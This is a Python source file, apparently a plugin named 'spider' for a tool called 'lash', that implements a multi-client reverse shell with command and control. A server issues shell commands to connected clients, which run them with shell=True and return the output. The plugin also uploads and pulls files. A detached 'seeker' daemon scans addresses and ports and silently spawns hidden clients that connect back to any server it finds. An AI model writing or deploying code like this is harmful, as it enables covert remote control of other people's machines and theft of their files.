import base64
import os
import queue
import signal
import socket
import subprocess
import sys
import threading
import time
from datetime import datetime
from itertools import product
from pathlib import Path

from rich import print

from lash.plugins.spider.helpers import send_msg, recv_msg


def port_verify(port: str) -> int:
    try:
        return int(port)
    except ValueError:
        raise ValueError(f"Invalid port [{port}], must be an integer like 8080")


def run_server(host: str, port: int) -> None:  # noqa: C901
    clients: dict[str, socket.socket] = {}
    client_paths: dict[str, str] = {}
    lock = threading.Lock()
    welcome = {"lash": "web"}
    active: list[str | None] = [None]
    events: queue.Queue = queue.Queue()

    def handle_client(conn: socket.socket, addr: str) -> None:
        registered = False
        try:
            while True:
                msg = recv_msg(conn)
                mtype = msg.get("type")
                if mtype == "info":
                    path = msg.get("path", "")
                    with lock:
                        clients[addr] = conn
                        client_paths[addr] = path
                        is_first = active[0] is None
                        if is_first:
                            active[0] = addr
                    registered = True
                    if is_first:
                        events.put({"type": "connected", "addr": addr, "path": path})
                    else:
                        print(f"[yellow][new connection][/yellow] {addr} ({path})")
                elif mtype == "result" and registered:
                    path = msg.get("path", client_paths.get(addr, ""))
                    with lock:
                        client_paths[addr] = path
                    if active[0] == addr:
                        events.put({"type": "result", "data": msg.get("data", ""), "path": path})
                elif mtype == "file" and registered:
                    if active[0] == addr:
                        events.put({"type": "file", "filename": msg.get("filename", ""), "data": msg.get("data", "")})
        except (ConnectionError, OSError):
            pass
        finally:
            if registered:
                was_active = False
                with lock:
                    clients.pop(addr, None)
                    client_paths.pop(addr, None)
                    was_active = active[0] == addr
                    if was_active:
                        active[0] = None
                print(f"[red][disconnected][/red] {addr}")
                if was_active:
                    events.put({"type": "disconnected", "addr": addr})
            conn.close()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port))
        s.listen()
        print(f"[green]Server online[/green] [{host}:{port}] — waiting for first connection...")

        def accept_loop() -> None:
            while True:
                try:
                    conn, (ip, p) = s.accept()
                    addr = f"{ip}:{p}"
                    send_msg(conn, welcome)
                    threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
                except OSError:
                    break

        threading.Thread(target=accept_loop, daemon=True).start()

        # Block until first client connects
        while True:
            try:
                ev = events.get(timeout=0.5)
                if ev["type"] == "connected":
                    print(f"[green][plugged into][/green] {ev['addr']}")
                    break
            except queue.Empty:
                pass

        while True:
            with lock:
                addr = active[0]
                path = client_paths.get(addr, "") if addr else ""

            if not addr:
                try:
                    ev = events.get(timeout=0.5)
                    if ev["type"] == "connected":
                        print(f"[green][plugged into][/green] {ev['addr']}")
                except queue.Empty:
                    pass
                continue

            try:
                command = input(f"[{addr}] {path}$ ").strip()
            except (KeyboardInterrupt, EOFError):
                break

            if not command:
                continue

            if command == "@help":
                print(
                    "[bold]Internal commands:[/bold]\n"
                    "  [cyan]@help[/cyan]                       Show this help guide\n"
                    "  [cyan]@list-clients[/cyan]               List all connected clients\n"
                    "  [cyan]@client-conn <ip:port>[/cyan]      Switch active client\n"
                    "  [cyan]@up <path>[/cyan]                  Upload file to client CWD (path relative to server)\n"
                    "  [cyan]@down <path>[/cyan]                Download file from client CWD (path relative to client)\n"
                    "  [cyan]kill[/cyan]                        Disconnect and stop server\n"
                    "  [dim]<any other input>[/dim]             Send shell command to active client"
                )
                continue

            if command == "@list-clients":
                with lock:
                    snapshot = list(clients.keys())
                    cur = active[0]
                if not snapshot:
                    print("No clients connected")
                for a in snapshot:
                    marker = " [active]" if a == cur else ""
                    p = client_paths.get(a, "")
                    print(f"  {a} ({p}){marker}")
                continue

            if command.startswith("@client-conn"):
                parts = command.split(None, 1)
                if len(parts) < 2:
                    print("[red]Usage: @client-conn <ip:port>[/red]")
                    continue
                target = parts[1].strip()
                with lock:
                    if target in clients:
                        active[0] = target
                        p = client_paths.get(target, "")
                        print(f"[green]Switched to {target} ({p})[/green]")
                    else:
                        print(f"[red]Client {target} not found[/red]")
                continue

            if command.startswith("@up"):
                parts = command.split(None, 1)
                if len(parts) < 2:
                    print("[red]Usage: @up <local_path>[/red]")
                    continue
                filepath = Path(os.getcwd()) / parts[1].strip()
                try:
                    raw = filepath.read_bytes()
                except OSError as e:
                    print(f"[red]{e}[/red]")
                    continue
                with lock:
                    conn = clients.get(active[0])
                if not conn:
                    print("[red]No active client[/red]")
                    continue
                try:
                    send_msg(conn, {"type": "upload", "filename": filepath.name, "data": base64.b64encode(raw).decode()})
                except OSError:
                    continue
                while True:
                    try:
                        ev = events.get(timeout=30)
                        if ev["type"] == "result":
                            if ev["data"]:
                                print(ev["data"], end="", flush=True)
                            break
                        elif ev["type"] == "connected":
                            print(f"\n[yellow][new connection][/yellow] {ev['addr']}")
                        elif ev["type"] == "disconnected":
                            print("\n[red][active client disconnected][/red]")
                            break
                    except queue.Empty:
                        print("[yellow][timeout — no response in 30s][/yellow]")
                        break
                continue

            if command.startswith("@down"):
                parts = command.split(None, 1)
                if len(parts) < 2:
                    print("[red]Usage: @down <remote_path>[/red]")
                    continue
                with lock:
                    conn = clients.get(active[0])
                if not conn:
                    print("[red]No active client[/red]")
                    continue
                try:
                    send_msg(conn, {"type": "download", "path": parts[1].strip()})
                except OSError:
                    continue
                while True:
                    try:
                        ev = events.get(timeout=30)
                        if ev["type"] == "file":
                            fname = ev["filename"]
                            dest = Path(os.getcwd()) / fname
                            dest.write_bytes(base64.b64decode(ev["data"]))
                            print(f"[green]Downloaded {fname} → {dest}[/green]")
                            break
                        elif ev["type"] == "result":
                            if ev["data"]:
                                print(ev["data"], end="", flush=True)
                            break
                        elif ev["type"] == "connected":
                            print(f"\n[yellow][new connection][/yellow] {ev['addr']}")
                        elif ev["type"] == "disconnected":
                            print("\n[red][active client disconnected][/red]")
                            break
                    except queue.Empty:
                        print("[yellow][timeout — no response in 30s][/yellow]")
                        break
                continue

            if command == "kill":
                break

            with lock:
                conn = clients.get(active[0])
            if not conn:
                print("[red]No active client[/red]")
                continue

            try:
                send_msg(conn, {"type": "cmd", "data": command})
            except OSError:
                continue

            # Wait for result from active client
            while True:
                try:
                    ev = events.get(timeout=30)
                    if ev["type"] == "result":
                        if ev["data"]:
                            print(ev["data"], end="", flush=True)
                        break
                    elif ev["type"] == "connected":
                        print(f"\n[yellow][new connection][/yellow] {ev['addr']}")
                    elif ev["type"] == "disconnected":
                        print("\n[red][active client disconnected][/red]")
                        break
                except queue.Empty:
                    print("[yellow][timeout — no response in 30s][/yellow]")
                    break


def run_web_client(host: str, port: int) -> None:  # noqa: C901
    local_ip = socket.gethostbyname(socket.gethostname())
    cwd = os.getcwd()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        welcome = recv_msg(s)
        if "lash" not in welcome:
            return
        send_msg(s, {"type": "info", "path": cwd, "addr": local_ip})
        while True:
            try:
                msg = recv_msg(s)
            except (ConnectionError, OSError):
                break
            mtype = msg.get("type")
            if mtype == "upload":
                filename = msg.get("filename", "file")
                (Path(cwd) / filename).write_bytes(base64.b64decode(msg["data"]))
                send_msg(s, {"type": "result", "data": f"Uploaded {filename}\n", "path": cwd, "addr": local_ip})
                continue
            if mtype == "download":
                try:
                    src = Path(cwd) / msg.get("path", "")
                    send_msg(s, {"type": "file", "filename": src.name, "data": base64.b64encode(src.read_bytes()).decode()})
                except OSError as e:
                    send_msg(s, {"type": "result", "data": f"Error: {e}\n", "path": cwd, "addr": local_ip})
                continue
            if mtype != "cmd":
                continue
            command = msg["data"].strip()
            parts = command.split(None, 1)
            if parts and parts[0] == "cd":
                target = parts[1] if len(parts) > 1 else str(Path.home())
                try:
                    os.chdir(target)
                    cwd = os.getcwd()
                    output = ""
                except OSError as e:
                    output = f"{e}\n"
            else:
                result = subprocess.run(
                    command, shell=True, capture_output=True, text=True, cwd=cwd
                )
                output = result.stdout + result.stderr
            send_msg(s, {"type": "result", "data": output, "path": cwd, "addr": local_ip})


def seeker_pid_path() -> Path:
    return Path.home() / ".lash" / "seeker.pid"


def seeker_log_path() -> Path:
    return Path.home() / ".lash" / "seeker.log"


def write_pid(pid: int) -> None:
    p = seeker_pid_path()
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(str(pid))


def read_pid() -> int | None:
    p = seeker_pid_path()
    if not p.exists():
        return None
    try:
        return int(p.read_text().strip())
    except ValueError:
        return None


def is_pid_alive(pid: int) -> bool:
    try:
        os.kill(pid, 0)
        return True
    except (OSError, ProcessLookupError):
        return False


def seeker_scan_loop(addresses: list[str], ports: list[int], ping_interval: int) -> None:
    connected_servers: set[tuple[str, int]] = set()
    while True:
        _scan_once(addresses, ports, connected_servers)
        time.sleep(ping_interval)


def _scan_once(
    addresses: list[str],
    ports: list[int],
    connected_servers: set[tuple[str, int]],
) -> None:
    for ip, port in product(addresses, ports):
        if (ip, port) in connected_servers:
            continue
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2)
                s.connect((ip, port))
                s.settimeout(None)
                msg = recv_msg(s)
        except (OSError, ConnectionError):
            continue

        server_cmd = msg.get("lash")
        if not server_cmd:
            continue

        connected_servers.add((ip, port))

        log_path = seeker_log_path()
        log_path.parent.mkdir(parents=True, exist_ok=True)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(log_path, "a", encoding="utf-8") as f:
            f.write(
                f"[{timestamp}] {server_cmd} @ {ip}:{port}"
                f" -> lash spider {server_cmd} -c {ip} {port}\n"
            )

        _spawn_client(server_cmd, ip, port)


def _spawn_client(server_cmd: str, ip: str, port: int) -> None:
    argv = [sys.executable, "-m", "lash", "spider", server_cmd, "-c", ip, str(port)]
    if sys.platform == "win32":
        subprocess.Popen(
            argv,
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
        )
    else:
        subprocess.Popen(
            argv,
            start_new_session=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
        )


def spawn_daemon(addresses: str, ports: str, ping_interval: int) -> None:
    argv = [
        sys.executable, "-m", "lash", "spider", "seeker",
        addresses, ports,
        "--ping", str(ping_interval),
        "--_daemon",
    ]
    if sys.platform == "win32":
        subprocess.Popen(
            argv,
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
        )
    else:
        subprocess.Popen(
            argv,
            start_new_session=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
        )


def stop_seeker() -> str:
    pid = read_pid()
    if pid is None:
        return "Seeker not running"
    if not is_pid_alive(pid):
        seeker_pid_path().unlink(missing_ok=True)
        return "Seeker not running"
    os.kill(pid, signal.SIGTERM)
    seeker_pid_path().unlink(missing_ok=True)
    return f"Seeker stopped (PID: {pid})"
